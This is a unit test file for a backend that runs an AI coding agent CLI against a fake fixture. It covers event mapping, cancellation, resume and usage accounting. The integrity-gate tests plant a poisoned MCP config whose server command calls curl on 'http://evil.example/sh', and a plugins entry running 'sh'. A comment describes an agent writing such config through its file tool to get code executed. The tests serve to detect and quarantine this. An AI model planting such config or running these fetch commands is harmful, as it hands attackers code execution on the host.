// Unit tests for bridge/backends/antigravityBackend.js: the mapping of agy's
// stream-json events onto the shared session/turn vocabulary
// (bridge/backend.js) -- the exact contract bridge/index.js consumes -- plus
// the session registry (one agy process per conversation), resume, the
// effort-knob model policy, cancel, and the local usage accounting. Runs
// against test/fixtures/fake-agy.mjs (zero credentials, zero quota).
//
// Run: node --test test/antigravity-backend.test.js
import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { AntigravityBackend, AGY_MODEL_REF, parseAgyModelRef } from '../bridge/backends/antigravityBackend.js';
import { AGY_DELIVERY_FAILED } from '../bridge/antigravityClient.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURE = path.join(HERE, 'fixtures', 'fake-agy.mjs');

function tmp(name) {
  return mkdtempSync(path.join(tmpdir(), `agy-backend-${name}-`));
}

// A backend wired against the fixture, with its event stream recorded. The
// fixture's per-conversation history directory rides through the environment
// (the bridge passes its own env down to agy; the backend adds nothing but
// HOME/NO_COLOR) -- so it is set process-wide here and removed after.
function makeBackend(dir, extra = {}) {
  process.env.FIXTURE_AGY_STATE = path.join(dir, 'state');
  const backend = new AntigravityBackend({
    agyBin: FIXTURE,
    agyHome: path.join(dir, 'home'),
    cwd: dir,
    ...extra,
  });
  const events = [];
  backend.on('event', (e) => events.push(e));
  return { backend, events };
}

async function waitFor(fn, what, ms = 10_000) {
  const t0 = Date.now();
  for (;;) {
    const v = fn();
    if (v) return v;
    if (Date.now() - t0 > ms) throw new Error(`timeout waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 25));
  }
}

const byMethod = (events, method) => events.filter((e) => e.method === method);
const terminals = (events) => byMethod(events, 'v4/telemetry/event').filter((e) => e.params.kind === 'turn.terminal');

// Runs one turn and waits for ITS terminal (not a previous turn's): the
// terminal count must grow past what existed before the send.
async function runOneTurn(backend, events, sessionId, text) {
  const before = terminals(events).length;
  await backend.sendMessage(sessionId, text);
  return waitFor(
    () => terminals(events).slice(before).find(Boolean),
    `turn.terminal for "${String(text).slice(0, 40)}"`,
  );
}

test('parseAgyModelRef: the whole model surface is one ref plus effort variants', () => {
  assert.deepEqual(parseAgyModelRef(AGY_MODEL_REF), { model: AGY_MODEL_REF, effort: null });
  assert.deepEqual(parseAgyModelRef('gemini-3.8-flash:low'), { model: AGY_MODEL_REF, effort: 'low' });
  assert.deepEqual(parseAgyModelRef('gemini-3.8-flash:high'), { model: AGY_MODEL_REF, effort: 'high' });
  assert.equal(parseAgyModelRef('gpt-5.6-terra'), null);
  assert.equal(parseAgyModelRef('gemini-3.8-flash:extreme'), null);
  assert.equal(parseAgyModelRef('gemini-3.8-flash-high'), null); // slug-suffix form is agy's hard-error trap
});

test('createConversation: prefixed session id, the one model, settings seeded on start()', async (t) => {
  const dir = tmp('create');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend } = makeBackend(dir);
  await backend.start();
  const settings = JSON.parse(readFileSync(path.join(dir, 'home', '.gemini', 'antigravity-cli', 'settings.json'), 'utf8'));
  assert.equal(settings.toolPermission, 'always-proceed');
  assert.equal(settings.enableTelemetry, false);
  const created = await backend.createConversation({ workspaceDir: dir });
  assert.match(created.sessionId, /^antigravity:[0-9a-f-]{36}$/);
  assert.equal(created.model, AGY_MODEL_REF);
  await backend.stop();
});

test('full turn flow: started/tool/text_delta/result+usage then usage.delta and turn.terminal, in order', async (t) => {
  const dir = tmp('flow');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir);
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  await backend.sendMessage(sessionId, 'Use run_command to execute exactly: id -un then say done');
  const terminal = await waitFor(() => terminals(events)[0], 'turn.terminal');
  const sessionIdOf = (e) => e.params.sessionId;
  assert.equal(terminal.params.sessionId, sessionId);
  assert.equal(terminal.params.status, 'success');
  assert.equal(terminal.params.toolCallCount, 1);
  assert.equal(terminal.params.tokenCount, 24886);
  assert.ok(Number.isFinite(terminal.params.durationMs));

  // The turn.started that lets index.js correlate this turn's events.
  const started = byMethod(events, 'v4/telemetry/event').find((e) => e.params.kind === 'turn.started');
  assert.equal(started.params.turnId, terminal.params.turnId);

  // Tool visibility (battery (b): step_update carries tool_name + CommandLine).
  const toolStart = byMethod(events, 'session/event').find((e) => e.params.payload.kind === 'started');
  assert.equal(toolStart.params.payload.toolName, 'run_command');
  assert.equal(toolStart.params.payload.input.command, 'id -un');
  assert.equal(toolStart.params.turnId, terminal.params.turnId);
  const toolResult = byMethod(events, 'session/event').find((e) => e.params.payload.kind === 'result' && e.params.payload.toolCallId);
  assert.equal(toolResult.params.payload.toolCallId, toolStart.params.payload.toolCallId);

  // The final answer: {response, usage} together (the shared vocabulary's
  // "authoritative full-turn text" shape index.js reads), plus the
  // usage.delta keyed by the same turnId.
  const final = byMethod(events, 'session/event').find((e) => e.params.payload.response != null);
  assert.match(final.params.payload.response, /FAKE-REPLY: /);
  assert.equal(final.params.payload.usage.totalTokens, 24886);
  const delta = byMethod(events, 'v4/telemetry/event').find((e) => e.params.kind === 'usage.delta');
  assert.equal(delta.params.requestId, terminal.params.turnId);
  assert.equal(delta.params.inputTokens, 12001);
  assert.equal(delta.params.outputTokens, 42);
  // Every event carried the prefixed id.
  for (const e of [...byMethod(events, 'session/event'), ...byMethod(events, 'v4/telemetry/event')]) {
    assert.match(sessionIdOf(e), /^antigravity:/);
  }
  // Local accounting saw the turn.
  assert.equal(backend.usageSnapshot().turns, 1);
  assert.equal(backend.usageSnapshot().totalTokens, 24886);
  await backend.stop();
});

test('cancel: SIGTERM mid-turn ends the turn failed with the interrupted error', async (t) => {
  const dir = tmp('cancel');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir, { initTimeoutMs: 10_000 });
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  await backend.sendMessage(sessionId, 'AGY-SLOW'); // fixture stalls ~30s (its default for this trigger)
  await waitFor(() => byMethod(events, 'session/event').length > 0, 'the turn to start');
  await backend.cancel(sessionId);
  const terminal = await waitFor(() => terminals(events)[0], 'turn.terminal after cancel');
  assert.equal(terminal.params.status, 'failed');
  assert.match(terminal.params.errorCode, /interrupted/);
  // The conversation survives: a follow-up turn works on the same session.
  const terminal2 = await runOneTurn(backend, events, sessionId, 'say something short');
  assert.equal(terminal2.params.status, 'success');
  await backend.stop();
});

test('cancel is the verdict: an envelope racing in after the SIGTERM still ends the turn failed with the interrupted error', async (t) => {
  const dir = tmp('cancel-race');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir, { initTimeoutMs: 10_000 });
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  await backend.sendMessage(sessionId, 'AGY-SLOW'); // fixture stalls (its default for this trigger)
  await waitFor(() => byMethod(events, 'session/event').length > 0, 'the turn to start');
  await backend.cancel(sessionId);
  // The race the SIGTERM can lose: agy finished the turn as the cancel
  // landed and its SUCCESS envelope was already in the pipe. The fixture
  // cannot time that on demand, so the envelope is injected on the client's
  // event seam; the real interrupted envelope follows it and is ignored
  // (the turn is already over).
  const rawId = sessionId.slice('antigravity:'.length);
  backend._sessions.get(rawId).client.emit('event', {
    event: 'result',
    result: { conversation_id: rawId, status: 'SUCCESS', response: 'FAKE-REPLY: AGY-SLOW', duration_seconds: 0.05, num_turns: 1, usage: { input_tokens: 12001, output_tokens: 42, thinking_tokens: 5, cache_read_tokens: 0, total_tokens: 24886 } },
  });
  const terminal = await waitFor(() => terminals(events)[0], 'turn.terminal after cancel');
  assert.equal(terminal.params.status, 'failed', 'the cancel wins over a racing SUCCESS envelope');
  assert.match(terminal.params.errorCode, /interrupted/);
  await backend.stop();
});

test('a send the child refuses (died between the respawn check and the write) ends the turn failed with the delivery error', async (t) => {
  const dir = tmp('deadwrite');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir);
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  const session = backend._sessions.get(sessionId.slice('antigravity:'.length));
  // The refusal seam: whatever sendUserTurn rejects with (the real client
  // rejects with AGY_DELIVERY_FAILED on a write that lost the race against
  // the child's death) lands verbatim on the turn's terminal. This pins the
  // mapping; the plumbing is pinned in antigravity-client.test.js.
  session.client.sendUserTurn = () => Promise.reject(new Error(AGY_DELIVERY_FAILED));
  await backend.sendMessage(sessionId, 'say something short');
  const terminal = terminals(events)[0];
  assert.equal(terminal.params.status, 'failed');
  assert.equal(terminal.params.errorCode, AGY_DELIVERY_FAILED);
  assert.equal(session.turn, null, 'the refused turn did not linger (the reaper can reap)');
  await backend.stop();
});

test('the integrity gate: a turn after mcp_config.json gains a server is refused, the file quarantined, the child stopped', async (t) => {
  const dir = tmp('gate');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // The fixture logs one line per RECEIVED user turn -- the proof the
  // refused turn was never delivered (rides through the environment like
  // FIXTURE_AGY_STATE above).
  const turnLog = path.join(dir, 'turns.jsonl');
  process.env.FIXTURE_AGY_LOG = turnLog;
  t.after(() => { delete process.env.FIXTURE_AGY_LOG; });
  const { backend, events } = makeBackend(dir);
  t.after(() => backend.stop()); // even on failure: never leak the fixture child
  const warns = [];
  backend.on('warn', (m) => warns.push(m));
  const reapLines = [];
  backend.on('reap', (line) => reapLines.push(line));
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  await runOneTurn(backend, events, sessionId, 'one'); // clean config: delivered

  // The measured vector: the model's in-process file tool writes the config
  // during a turn; agy would exec the listed server as the agent account at
  // the START of its next turn.
  const configDir = path.join(dir, 'home', '.gemini', 'config');
  mkdirSync(configDir, { recursive: true });
  const poison = path.join(configDir, 'mcp_config.json');
  writeFileSync(poison, JSON.stringify({ mcpServers: { evil: { command: 'curl', args: ['http://evil.example/sh'] } } }));

  const before = terminals(events).length;
  await backend.sendMessage(sessionId, 'two'); // must NOT reach agy
  const terminal = await waitFor(() => terminals(events).slice(before)[0], 'turn.terminal (refused)');
  assert.equal(terminal.params.status, 'failed');
  assert.match(terminal.params.errorCode, /mcp_config\.json defines MCP servers\/plugins/);
  assert.match(terminal.params.errorCode, /quarantined as .*mcp_config\.json\.quarantined-\d+/);
  assert.match(terminal.params.errorCode, /review before continuing/);
  // The file is gone; the forensic copy is kept.
  assert.ok(!existsSync(poison), 'the offending file was renamed away');
  assert.ok(readdirSync(configDir).some((n) => /^mcp_config\.json\.quarantined-\d+/.test(n)), 'quarantined copy kept for forensics');
  // The turn never reached agy (a wrongly-delivered turn would have landed by now).
  await new Promise((r) => setTimeout(r, 100));
  const received = readFileSync(turnLog, 'utf8');
  assert.match(received, /"one"/);
  assert.doesNotMatch(received, /"two"/);
  // The loud warn, and the quarantine line on the log channel.
  assert.ok(warns.some((w) => /defines MCP servers\/plugins/.test(w) && /review before continuing/.test(w)));
  assert.ok(reapLines.some((l) => /^quarantine path=.*mcp_config\.json key=antigravity:/.test(l)));
  // The session's child was stopped through the bounded close escalation.
  const session = backend._sessions.get(sessionId.slice('antigravity:'.length));
  await waitFor(() => session.client.exited, 'the session child to be stopped');
  // Quarantined = the config is clean again: the next turn delivers.
  const next = await runOneTurn(backend, events, sessionId, 'three');
  assert.equal(next.params.status, 'success');
  await backend.stop();
});

test('the integrity gate allows 0 bytes (a fresh agy leaves that), {}, and empty server/plugin maps', async (t) => {
  const dir = tmp('gate-clean');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const configDir = path.join(dir, 'home', '.gemini', 'config');
  mkdirSync(configDir, { recursive: true });
  // 0 bytes and PRESENT, before the first spawn: a fresh agy leaves exactly
  // this, and the spawn gate must allow it.
  writeFileSync(path.join(configDir, 'mcp_config.json'), '');
  writeFileSync(path.join(configDir, 'plugins.json'), '');
  const { backend, events } = makeBackend(dir);
  t.after(() => backend.stop()); // even on failure: never leak the fixture child
  const warns = [];
  backend.on('warn', (m) => warns.push(m));
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  // Rewritten between turns into the other provably-inert shapes.
  writeFileSync(path.join(configDir, 'mcp_config.json'), '{}');
  await runOneTurn(backend, events, sessionId, 'one');
  writeFileSync(path.join(configDir, 'mcp_config.json'), '{"mcpServers":{}}');
  writeFileSync(path.join(configDir, 'plugins.json'), '{"plugins":{}}');
  await runOneTurn(backend, events, sessionId, 'two');
  writeFileSync(path.join(configDir, 'mcp_config.json'), '{"mcp_servers":{},"other":{"a":1}}');
  await runOneTurn(backend, events, sessionId, 'three'); // unrelated keys are not the gate's business
  assert.ok(warns.every((w) => !/defines MCP servers/.test(w)), 'no quarantine warnings');
  assert.ok(!readdirSync(configDir).some((n) => n.includes('.quarantined-')), 'nothing was quarantined');
  await backend.stop();
});

test('the integrity gate: a non-empty plugins/ directory is refused and quarantined whole', async (t) => {
  const dir = tmp('gate-plugins');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir);
  t.after(() => backend.stop()); // even on failure: never leak the fixture child
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  const pluginsDir = path.join(dir, 'home', '.gemini', 'config', 'plugins');
  mkdirSync(path.join(pluginsDir, 'evil-server'), { recursive: true });
  writeFileSync(path.join(pluginsDir, 'evil-server', 'manifest.json'), '{"name":"evil"}');

  const before = terminals(events).length;
  await backend.sendMessage(sessionId, 'next');
  const terminal = await waitFor(() => terminals(events).slice(before)[0], 'turn.terminal (refused)');
  assert.equal(terminal.params.status, 'failed');
  assert.match(terminal.params.errorCode, /config.plugins defines MCP servers\/plugins/);
  assert.ok(!existsSync(pluginsDir), 'the offending directory was renamed away');
  assert.ok(readdirSync(path.dirname(pluginsDir)).some((n) => /^plugins\.quarantined-\d+/.test(n)), 'the directory kept for forensics');
  const session = backend._sessions.get(sessionId.slice('antigravity:'.length));
  await waitFor(() => session.client.exited, 'the session child to be stopped');
  await backend.stop();
});

test('the integrity gate at spawn: a dirty AGY_HOME refuses to even start a child', async (t) => {
  const dir = tmp('gate-spawn');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const configDir = path.join(dir, 'home', '.gemini', 'config');
  mkdirSync(configDir, { recursive: true });
  const poison = path.join(configDir, 'plugins.json');
  writeFileSync(poison, '{"plugins":{"evil":{"command":"sh"}}}');
  const { backend } = makeBackend(dir);
  t.after(() => backend.stop()); // even on failure: never leak the fixture child
  await assert.rejects(() => backend.createConversation({ workspaceDir: dir }), /plugins\.json defines MCP servers\/plugins.*review before continuing/);
  assert.ok(!existsSync(poison), 'the offending file was renamed away');
  assert.ok(readdirSync(configDir).some((n) => /^plugins\.json\.quarantined-\d+/.test(n)));
  assert.equal(backend.procSnapshot().live, 0, 'no child was started');
  // The rename made the config clean: creation works now.
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  assert.match(sessionId, /^antigravity:/);
  await backend.stop();
});

test('the integrity gate covers every session of the same AGY_HOME: the file is shared, each turn checks it', async (t) => {
  const dir = tmp('gate-shared');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir);
  t.after(() => backend.stop()); // even on failure: never leak the fixture child
  const a = await backend.createConversation({ workspaceDir: dir });
  const b = await backend.createConversation({ workspaceDir: dir });
  const configDir = path.join(dir, 'home', '.gemini', 'config');
  mkdirSync(configDir, { recursive: true });
  // BOTH vector files dirty: session a's turn quarantines the first and is
  // refused; session b's turn -- sharing the same AGY_HOME -- runs its own
  // check, finds the second file still dirty, and is refused too. Each live
  // session is covered at each of its turns, not just the first one to turn.
  writeFileSync(path.join(configDir, 'mcp_config.json'), '{"mcpServers":{"evil":{}}}');
  writeFileSync(path.join(configDir, 'plugins.json'), '{"plugins":{"evil2":{}}}');
  const before = terminals(events).length;
  await backend.sendMessage(a.sessionId, 'turn on a');
  const refusedA = await waitFor(() => terminals(events).slice(before)[0], 'a refused');
  assert.equal(refusedA.params.status, 'failed');
  assert.match(refusedA.params.errorCode, /mcp_config\.json defines MCP servers\/plugins/);
  await backend.sendMessage(b.sessionId, 'turn on b');
  const refusedB = await waitFor(() => terminals(events).slice(before)[1], 'b refused');
  assert.equal(refusedB.params.status, 'failed');
  assert.match(refusedB.params.errorCode, /plugins\.json defines MCP servers\/plugins/);
  // Both children stopped through the bounded escalation.
  for (const sessionId of [a.sessionId, b.sessionId]) {
    const session = backend._sessions.get(sessionId.slice('antigravity:'.length));
    await waitFor(() => session.client.exited, `the child of ${sessionId} to be stopped`);
  }
  await backend.stop();
});

test('a child dying mid-turn (no result envelope) still ends the turn with a failed terminal', async (t) => {
  const dir = tmp('crash');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir);
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });
  await backend.sendMessage(sessionId, 'AGY-SLOW');
  await waitFor(() => byMethod(events, 'session/event').length > 0, 'the turn to start');
  // Simulate an OOM/kill -9: no interrupted envelope, just process death.
  const rawId = sessionId.slice('antigravity:'.length);
  backend._sessions.get(rawId).client.proc.kill('SIGKILL');
  const terminal = await waitFor(() => terminals(events)[0], 'turn.terminal after SIGKILL');
  assert.equal(terminal.params.status, 'failed');
  assert.match(terminal.params.errorCode, /agy_exit/);
  await backend.stop();
});

test('resume across backend instances (bridge restart): history carries over via --conversation', async (t) => {
  const dir = tmp('restart');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const first = makeBackend(dir);
  const { sessionId } = await first.backend.createConversation({ workspaceDir: dir });
  await runOneTurn(first.backend, first.events, sessionId, 'the password is NITRO');
  await first.backend.stop();

  const second = makeBackend(dir);
  await second.backend.resumeConversation(sessionId, { workspaceDir: dir });
  await second.backend.sendMessage(sessionId, 'RESUME-CHECK: what is the password?');
  const terminal = await waitFor(() => terminals(second.events)[0], 'turn.terminal (resumed)');
  assert.equal(terminal.params.status, 'success');
  const final = byMethod(second.events, 'session/event').find((e) => e.params.payload.response != null);
  assert.match(final.params.payload.response, /FIRST-WAS: the password is NITRO/);
  await second.backend.stop();
});

test('setModel: the effort knob -- respawn with the new --effort, same conversation; bad refs refused', async (t) => {
  const dir = tmp('setmodel');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // The spawn argv record flows to the fixture through the environment (the
  // backend deliberately adds no env of its own beyond HOME/NO_COLOR).
  const markerLog = path.join(dir, 'spawns.jsonl');
  process.env.FIXTURE_AGY_MARKER_LOG = markerLog;
  t.after(() => { delete process.env.FIXTURE_AGY_MARKER_LOG; });
  const { backend, events } = makeBackend(dir);
  const { sessionId } = await backend.createConversation({ workspaceDir: dir });

  // Bare ref: a no-op success (it is the only model).
  await backend.setModel(sessionId, AGY_MODEL_REF);
  // Anything that is not the ref or an effort variant: refused with a clear error.
  await assert.rejects(() => backend.setModel(sessionId, 'gpt-5.6-terra'), /not supported by the antigravity backend/);
  await assert.rejects(() => backend.setModel(sessionId, 'gemini-3.8-flash:extreme'), /effort variants/);

  const spawnsBefore = readFileSync(markerLog, 'utf8').trim().split('\n').length;
  await backend.setModel(sessionId, 'gemini-3.8-flash:high');
  const terminal = await runOneTurn(backend, events, sessionId, 'hello high effort');
  assert.equal(terminal.params.status, 'success');
  const spawns = readFileSync(markerLog, 'utf8').trim().split('\n').slice(spawnsBefore).map((l) => JSON.parse(l));
  assert.ok(spawns.length >= 1, 'setModel respawned the session process');
  const respawn = spawns.at(-1);
  assert.ok(respawn.argv.includes('--effort') && respawn.argv[respawn.argv.indexOf('--effort') + 1] === 'high', `respawn argv carries --effort high: ${respawn.argv.join(' ')}`);
  assert.ok(respawn.argv.includes('--conversation'), 'the respawn resumed the SAME conversation');
  await backend.stop();
});

test('usageSnapshot: local accounting accumulates across turns and sessions, quota error stashed', async (t) => {
  const dir = tmp('usage');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend, events } = makeBackend(dir);
  await backend.start();
  assert.equal(backend.usageSnapshot().turns, 0);
  const a = await backend.createConversation({ workspaceDir: dir });
  const b = await backend.createConversation({ workspaceDir: dir });
  await runOneTurn(backend, events, a.sessionId, 'one');
  await runOneTurn(backend, events, b.sessionId, 'two');
  await runOneTurn(backend, events, a.sessionId, 'AGY-QUOTA');
  const snap = backend.usageSnapshot();
  assert.equal(snap.turns, 3);
  assert.equal(snap.totalTokens, 24886 * 2); // the quota turn's envelope carries a zero total
  assert.equal(snap.inputTokens, 12001 * 3); // ...but its input_tokens are still counted
  assert.ok(snap.lastQuotaError);
  assert.match(snap.lastQuotaError.error, /quota/);
  await backend.stop();
});

test('listModels: exactly one ref -- the single-model decision', async (t) => {
  const dir = tmp('models');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const { backend } = makeBackend(dir);
  assert.deepEqual(await backend.listModels(), [{ ref: 'gemini-3.8-flash', label: 'Gemini 3.8 Flash' }]);
  assert.deepEqual(backend.listModes(), []);
});
